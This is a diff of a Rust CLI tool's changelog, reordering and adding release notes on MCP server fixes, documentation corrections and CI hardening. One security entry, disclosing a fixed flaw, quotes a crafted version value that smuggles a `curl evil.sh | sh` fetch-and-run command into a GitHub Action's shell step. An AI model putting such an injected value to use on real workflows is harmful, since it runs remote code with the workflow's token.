@@ -103,6 +103,8 @@ Conventional Commits format. All notable changes documented here.
 
 - **A residual figure that was challenged, upheld, and the challenge retracted at its source.** Cycle 19 spot-checked the "`outputSchema` at 1 of 11 MCP tools" residual, found no occurrence of `output_schema` anywhere in the CLI crate, and concluded the honest reading was zero of eleven. That was wrong. `check_gates` returns `Result<Json<GateSummary>, ErrorData>` — the only tool of the eleven that does — and `rmcp`'s `#[tool]` macro derives the output schema from a `Json<T>` return type, so the schema is published without the string appearing anywhere in this repository; an existing test already asserts the running server emits it. The refutation searched for a literal that a proc-macro makes unnecessary, which is the same macro-opacity mechanism that report established against `cargo-machete` two sections earlier. A claim of the form "feature X is not configured" is unfalsifiable by text search whenever the framework can infer X from a type signature. The finding ledger's location line for that item, which said all eleven tools return `Result<String, ErrorData>`, was stale from the day the pilot landed and now says ten.
 
+- **The documentation describes the shipping contract again, verified surface-by-surface.** A six-way audit cross-checked every user-facing doc against the code and fixed what had drifted: the Quick-start CSV sample carries the full header its command actually emits, `--time-bucket` values are spelled in the case clap accepts, the analysis catalogue includes every registered analysis, the cache-mechanics section states the ingest/analysis key split (threshold sweeps hit the cache; calibration artifacts no longer claim to invalidate it), the MCP startup flags are documented completely, the release runbook's manual fallback now names both rulesets and the exact CI-conclusion check the script performs, and the architecture snapshot's registry, trait, emitter and identity descriptions match the source they describe.
+
 ## [0.28.0] - 2026-08-17
 
 ### Fixed
@@ -203,21 +205,15 @@ Conventional Commits format. All notable changes documented here.
 
 ## [0.27.1] - 2026-08-07
 
+### Changed
+
+- **The MCP test suite pins the negotiated protocol revision, not the requested one.** It asserted only the value the test client sent, which says nothing about the server: an rmcp bump that shifted the supported revision, or a downgrade during negotiation, would have left every test passing while clients pinned to the old revision broke. Verified by handshake against the running server.
+
 ### Fixed
 
 - **Gate pseudo-paths are defined once instead of copied into each emitter.** A violation whose finding is about the repository rather than a file carries a sentinel path, and the gate layer mints six of them — but the SARIF emitter tested against its own list of three, which is how `(skipped)` came to be percent-encoded into an artifact URI that anchored a Code Scanning alert to a file that does not exist. That instance was fixed; the second copy that caused it was not. Every minting site and both membership tests now consult one `is_pseudo_path`, and the regression test iterates the canonical list rather than a local copy — so a seventh sentinel is handled by every consumer the day it is added, verified by adding one and confirming the emitter picked it up with no other edit.
 
-
-### Security
-
-- **Every third-party GitHub Action is now pinned to a commit SHA.** `Swatinem/rust-cache`, `benchmark-action/github-action-benchmark` and `taiki-e/install-action` floated on tags while the rest of the repository pinned by SHA — and `rust-cache` runs in the dogfood job, which carries `contents: write`. A tag is a mutable pointer its owner controls, so the exposure is whatever that owner repoints it at later. A guard now enforces the policy rather than leaving it to whoever remembers it, exempting GitHub's first-party namespace and `dtolnay/rust-toolchain` (whose tag names the toolchain to install, not a release of the action).
-
-### Fixed
-
 - **The crates.io publish probe no longer treats a registry hiccup as "not published".** It used `curl -sSf`, which fails on any non-2xx — so a transient 5xx or a timeout read as absent and fell through to publish. If the crate *was* already there, `cargo publish` then fails on "already exists" and `set -e` aborts the job mid-sequence, which is the unrecoverable state the idempotence check exists to prevent. It now branches on the HTTP status: 200 skips, 404 publishes, and anything else retries and then fails closed rather than guessing.
-
-
-### Fixed
 
 - **A head-only ingest now persists its cache entry.** The blind-ingest guard asked whether any commits were ingested — but a head-only ingest walks no commits by design, so that test was true on every healthy run: the store just written to disk was discarded and the expensive HEAD complexity scan re-run into memory. `codelore calibrate` takes this path once per corpus repository, so it paid the scan twice per repo and could never persist an entry to reuse on the next run. The witness now matches the ingest mode, testing the table the head-only scan actually fills. The full-ingest path is unchanged, and the guard that refuses to persist a truly blind ingest still holds.
 
@@ -228,13 +224,6 @@ Conventional Commits format. All notable changes documented here.
 - **The MCP `hotspots` tool now discloses truncation like every sibling list tool.** It capped the ranking and returned a bare array — and the file's convention is that a bare array means the list is complete, so an agent read a cut-off ranking as the whole population and could conclude a file was not a hotspot when it had merely fallen past the cap. It now appends the same `{omitted, total, note}` summary `delta_health` and `function_hotspots` already use.
 
 - **The MCP server no longer tells operators it is read-only.** The `instructions` string clients display still opened with "Read-only.", while `delta_health` creates and removes throwaway `git worktree` checkouts — which the module docstring, the tool's own comment and its `readOnlyHint: false` annotation all acknowledge. The code knew; the string the operator sees did not. It now states that no tool modifies tracked content and names what `delta_health` does.
-
-### Changed
-
-- **The MCP test suite pins the negotiated protocol revision, not the requested one.** It asserted only the value the test client sent, which says nothing about the server: an rmcp bump that shifted the supported revision, or a downgrade during negotiation, would have left every test passing while clients pinned to the old revision broke. Verified by handshake against the running server.
-
-
-### Fixed
 
 - **The zero-row notice no longer prescribes a remedy that most analyses cannot use.** It closed by suggesting `--min-revs 1`, but `min_revs` is a genuine filter in only 17 of the analysis modules — 23 more name it solely in a tracing span and 23 never mention it. On `defect-validation` the effect was self-contradictory: the analysis printed the correct instruction to build a calibration artifact, and the notice immediately advised lowering a threshold it does not read. The notice now states the analysis, the zero, and the options that were set, and stops. The options summary still carries `min-revs=<n>`, so where it *is* the cause the number sits beside the zero; §12 of the advanced-usage guide covers the header-only case explicitly.
 
@@ -250,13 +239,13 @@ Conventional Commits format. All notable changes documented here.
 
 - **Two Action-guide examples that cannot run.** The SARIF matrix included `knowledge-islands`, which has no SARIF rule, so that leg exited 2 on every run while the guide presented it as a working pattern; it is replaced with `clones`. And `check --format json` was offered as the machine-readable option, but `check` accepts `text | sarif` — `json` is a `gate` format, so the documented command failed at parse time.
 
+- **The "Health over time" Action example now runs.** It requested `format: html` for `health-trend` and `architecture-trend`; neither has an HTML emitter, so both steps exited 2 and the artifact upload collected files that were never written — the documented happy path for the tool's headline job, broken on first use. Both now use `markdown`, with a note that `csv` is the machine-readable choice and that HTML is unavailable for these two. Every command in the README's matching walkthrough was re-run and verified to exit 0.
+
 ### Security
 
+- **Every third-party GitHub Action is now pinned to a commit SHA.** `Swatinem/rust-cache`, `benchmark-action/github-action-benchmark` and `taiki-e/install-action` floated on tags while the rest of the repository pinned by SHA — and `rust-cache` runs in the dogfood job, which carries `contents: write`. A tag is a mutable pointer its owner controls, so the exposure is whatever that owner repoints it at later. A guard now enforces the policy rather than leaving it to whoever remembers it, exempting GitHub's first-party namespace and `dtolnay/rust-toolchain` (whose tag names the toolchain to install, not a release of the action).
+
 - **The Action's `version` input can no longer reach a shell.** Inputs were routed through the environment so a crafted value could not break out of the script it was read in — but `version` also becomes a step output, and the install step consumed that output with `${{ }}`, which splices into the script text at render time. A value like `v1.0"; curl evil.sh | sh; "` therefore executed in the job with the workflow's token, one hop past the protection, while the file's comments asserted the surface was closed. The resolve step now rejects anything that is not a `vX.Y.Z` tag before writing the output, and the install step reads its step outputs through the environment as well — two independent barriers. CI gained a step that passes a crafted version and fails the build unless it is rejected *and* no command ran; the existing Action smoke test only ever exercised the happy path, which is how the gap shipped.
-
-### Fixed
-
-- **The "Health over time" Action example now runs.** It requested `format: html` for `health-trend` and `architecture-trend`; neither has an HTML emitter, so both steps exited 2 and the artifact upload collected files that were never written — the documented happy path for the tool's headline job, broken on first use. Both now use `markdown`, with a note that `csv` is the machine-readable choice and that HTML is unavailable for these two. Every command in the README's matching walkthrough was re-run and verified to exit 0.
 
 ## [0.27.0] - 2026-08-06
 
